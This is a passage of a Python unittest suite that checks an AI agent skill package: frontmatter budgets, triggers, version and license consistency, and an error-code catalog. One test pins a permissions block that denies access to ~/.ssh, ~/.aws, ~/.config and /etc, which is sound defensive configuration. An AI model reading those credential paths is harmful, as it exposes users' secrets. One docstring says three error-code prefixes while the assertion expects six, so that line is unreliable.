        end = next((i for i, l in enumerate(lines[1:], start=1) if l.strip() == "---"), None)
        self.assertIsNotNone(end, "SKILL.md frontmatter has no closing '---'")
        return lines, end

    def test_skill_md_frontmatter_line_budget(self):
        """section 6.1: the SKILL.md frontmatter must be <= 85 lines."""
        _lines, end = self._frontmatter_lines()
        self.assertLessEqual(end + 1, 85, f"frontmatter is {end + 1} lines; section 6.1 allows <= 85")

    def test_description_length_within_spec_budget(self):
        """section 6.1: description is a 700-900 character English paragraph (P16 <= 1024)."""
        fm = parse_frontmatter(SKILL_DIR / "SKILL.md")
        desc = str(fm.get("description", ""))
        self.assertGreaterEqual(len(desc), 700, f"description is {len(desc)} chars; section 6.1 requires >= 700")
        self.assertLessEqual(len(desc), 900, f"description is {len(desc)} chars; section 6.1 allows <= 900")

    def test_tags_and_triggers_budgets(self):
        """section 6.1 / section 2: 8-16 tags and exactly 15 unique lowercase triggers."""
        lines, end = self._frontmatter_lines()
        fm_lines = lines[1:end]
        tags_line = next((l for l in fm_lines if re.match(r"^tags\s*:", l)), None)
        self.assertIsNotNone(tags_line, "frontmatter has no tags line")
        tags = [t.strip() for t in re.search(r"\[(.*)\]", tags_line).group(1).split(",") if t.strip()]
        self.assertGreaterEqual(len(tags), 8, f"{len(tags)} tags; section 6.1 requires >= 8")
        self.assertLessEqual(len(tags), 16, f"{len(tags)} tags; section 6.1 allows <= 16")
        triggers, in_triggers = [], False
        for line in fm_lines:
            if re.match(r"^triggers\s*:\s*$", line):
                in_triggers = True
                continue
            if in_triggers:
                if re.match(r"^\S", line):
                    break
                m = re.match(r"^\s*-\s+(.*\S)\s*$", line)
                if m:
                    triggers.append(m.group(1))
        self.assertEqual(15, len(triggers), f"{len(triggers)} triggers; section 2 requires exactly 15")
        self.assertEqual(len(set(triggers)), len(triggers), f"duplicate triggers: {triggers}")
        self.assertEqual(
            [t for t in triggers if t != t.lower()], [],
            "triggers must be lowercase task phrases",
        )

    def test_permissions_block_byte_identical_to_spec(self):
        """section 9.1 / section 15: the permissions block is copied character-for-character."""
        lines = (SKILL_DIR / "SKILL.md").read_text(encoding="utf-8").splitlines()
        start = next((i for i, l in enumerate(lines) if l == "permissions:"), None)
        self.assertIsNotNone(start, "permissions block not found in SKILL.md")
        end = next(i for i in range(start + 1, len(lines)) if lines[i] and not lines[i][0].isspace())
        actual = "\n".join(lines[start:end])
        canonical = "\n".join([
            "permissions:",
            "  files:",
            '    read:  ["{WORKSPACE_ROOT}/**", "{SKILL_DIR}/**"]',
            '    write: ["{WORKSPACE_ROOT}/**"]',
            '    deny:  ["~/.ssh/**", "~/.aws/**", "~/.config/**", "/etc/**", "{WINDOWS_DIR}/**"]',
            "  network: []",
            "  commands: []",
            "  mcp: [sessions_send, subagents]",
        ])
        self.assertEqual(canonical, actual, "permissions block differs from README-FOR-AI.md section 9.1")

    def test_dependency_and_prefix_declarations(self):
        """section 6.1: dependencies is empty; error_code_prefixes lists exactly the three prefixes."""
        fm = parse_frontmatter(SKILL_DIR / "SKILL.md")
        self.assertEqual("[]", str(fm.get("dependencies", "")).strip(), "dependencies must be an empty array")
        lines, end = self._frontmatter_lines()
        prefix_line = next((l for l in lines[1:end] if re.match(r"^error_code_prefixes\s*:", l)), None)
        self.assertIsNotNone(prefix_line, "error_code_prefixes missing from the frontmatter")
        prefixes = [p.strip() for p in re.search(r"\[(.*)\]", prefix_line).group(1).split(",")]
        self.assertEqual(["CEO_", "CTO_", "CISO_", "CHO_", "CQO_", "SCL_"], prefixes,
                         "error_code_prefixes must be exactly [CEO_, CTO_, CISO_, CHO_, CQO_, SCL_]")

    def test_errors_empty_and_self_scaling_propose_only(self):
        """P17: frontmatter errors is empty. P36: upgrade_policy is propose-only."""
        lines, end = self._frontmatter_lines()
        fm_text = "\n".join(lines[1:end])
        self.assertRegex(fm_text, r"(?m)^errors:\s*\[\s*\]",
                         "frontmatter errors must be an empty list (P17)")
        self.assertRegex(fm_text, r"(?m)^\s*upgrade_policy:\s*propose-only\s*$",
                         "self_scaling.upgrade_policy must be propose-only (P36)")
        self.assertRegex(fm_text, r"(?m)^\s*max_tier:\s*group\s*$",
                         "self_scaling.max_tier must be group")

    def test_harness_baseline_declared(self):
        """section 8.2: metadata.harness_baseline is L3 and every D2 page declares the same."""
        fm = parse_frontmatter(SKILL_DIR / "SKILL.md")
        self.assertEqual("L3", str(fm.get("metadata", {}).get("harness_baseline")),
                         "metadata.harness_baseline must be L3")
        dept_dir = SKILL_DIR / "references" / "departments"
        for name in sorted(EXPECTED_DEPARTMENT_BLOCKS):
            text = (dept_dir / name).read_text(encoding="utf-8")
            self.assertIn("Department Harness Baseline: L3", text,
                          f"{name} lacks the section 8.2 baseline declaration")

    def test_agents_md_line_budget_and_scope(self):
        """P55: AGENTS.md stays under 150 lines and keeps its first-screen scope declaration."""
        lines = (SKILL_DIR / "AGENTS.md").read_text(encoding="utf-8").splitlines()
        self.assertLessEqual(len(lines), 150, f"AGENTS.md is {len(lines)} lines; P55 allows <= 150")
        self.assertIn("maintain", "\n".join(lines[:6]).lower(),
                      "AGENTS.md lacks the first-screen maintainer-scope declaration")

    def test_three_version_locations_agree(self):
        """section 6.1 / section 15: _meta.json, the README badge and the frontmatter carry one version."""
        meta = json.loads((SKILL_DIR / "_meta.json").read_text(encoding="utf-8"))
        self.assertEqual({"ownerId", "slug", "version", "license", "publishedAt"}, set(meta),
                         "_meta.json keys differ from section 6.1")
        fm = parse_frontmatter(SKILL_DIR / "SKILL.md")
        badge = re.search(r"version-(\d+\.\d+\.\d+)-blue",
                          (SKILL_DIR / "README.md").read_text(encoding="utf-8"))
        self.assertIsNotNone(badge, "README.md badge is not in the version-<semver>-blue format")
        self.assertEqual({str(meta["version"]), str(fm.get("version")), badge.group(1)}, {SKILL_VERSION},
                         "the three version locations do not agree")

    def test_license_locations_agree(self):
        """section 6.1 / section 15: the four license declarations are all GPL-3.0."""
        meta = json.loads((SKILL_DIR / "_meta.json").read_text(encoding="utf-8"))
        fm = parse_frontmatter(SKILL_DIR / "SKILL.md")
        self.assertEqual("GPL-3.0", str(fm.get("license")))
        self.assertEqual("GPL-3.0", str(meta.get("license")))
        self.assertEqual("GPL-3.0", str(fm.get("metadata", {}).get("license")))
        license_text = (SKILL_DIR / "LICENSE").read_text(encoding="utf-8")
        self.assertIn("GNU GENERAL PUBLIC LICENSE", license_text)
        self.assertIn("Version 3", license_text)

    def test_error_code_catalog_integrity(self):
        """section 10.3 / section 15: 34 codes across 6 prefixes, continuous, D2 tables identical to the catalog."""
        catalog = parse_error_code_rows(
            (SKILL_DIR / "references" / "error-codes.md").read_text(encoding="utf-8")
        )
        expected_total = sum(EXPECTED_CODES_BY_PREFIX.values())
        self.assertEqual(expected_total, len(catalog),
                         f"catalog has {len(catalog)} codes; section 2 requires {expected_total}")
        for prefix, count in EXPECTED_CODES_BY_PREFIX.items():
            nums = sorted(int(c.split("_")[1]) for c in catalog if c.startswith(prefix))
            self.assertEqual(list(range(1, count + 1)), nums,
                             f"{prefix} numbering is not continuous 001..{count:03d}")
        owners = {}
        for name in sorted(EXPECTED_DEPARTMENT_BLOCKS):
            text = (SKILL_DIR / "references" / "departments" / name).read_text(encoding="utf-8")
            blocks = list(re.finditer(r"(?ms)^## FB-(\d+)\s*:.*?(?=^## FB-\d+\s*:|\Z)", text))
            self.assertEqual(EXPECTED_DEPARTMENT_BLOCKS[name], len(blocks),
                             f"{name} does not expose the expected function blocks")
            for block_m in blocks:
                fb = block_m.group(1)
                sec = re.search(r"(?ms)^### 4\..*?(?=^### 5\.|\Z)", block_m.group(0))
                self.assertIsNotNone(sec, f"{name} FB-{fb} has no '### 4' error-code section")
                for code, cells in parse_error_code_rows(sec.group(0)).items():
                    owners.setdefault(code, []).append(f"{name}:FB-{fb}")
                    self.assertIn(code, catalog,
                                  f"{name} FB-{fb} references {code}, absent from error-codes.md")
                    self.assertEqual(catalog[code], cells,
                                     f"{code} wording differs between {name} FB-{fb} and error-codes.md")
        for code, holders in owners.items():
            self.assertEqual(1, len(holders), f"{code} is owned by multiple function blocks: {holders}")
        dept_prefixes = tuple(p for p in EXPECTED_CODES_BY_PREFIX if p != "SCL_")
        department_codes = {c for c in catalog if c.startswith(dept_prefixes)}
        self.assertEqual(department_codes, set(owners),
                         "department codes and FB '### 4' ownership do not cover each other")
        for code, message in _FIXED_SCL_MESSAGES.items():
            self.assertEqual(message, catalog[code][0], f"{code} message differs from section 10.3")

    def test_no_bare_code_fences(self):
        """section 6.3 / section 14.5: every opening code fence carries a language tag."""
        offenders = []
        for rel in package_relative_paths():
            if not rel.endswith(".md"):
                continue
            lines = (SKILL_DIR / rel).read_text(encoding="utf-8").splitlines()
            open_fence = False
            for number, line in enumerate(lines, start=1):
                m = re.match(r"^\s*" + _FENCE + r"(.*)$", line)
                if not m:
                    continue
                if not open_fence:
                    open_fence = True
                    if not m.group(1).strip():
                        offenders.append(f"{rel}:{number}")
                else:
                    open_fence = False
        self.assertEqual([], offenders,
                         f"bare opening code fences (a language tag is required): {offenders}")


if __name__ == "__main__":
    unittest.main(verbosity=2)
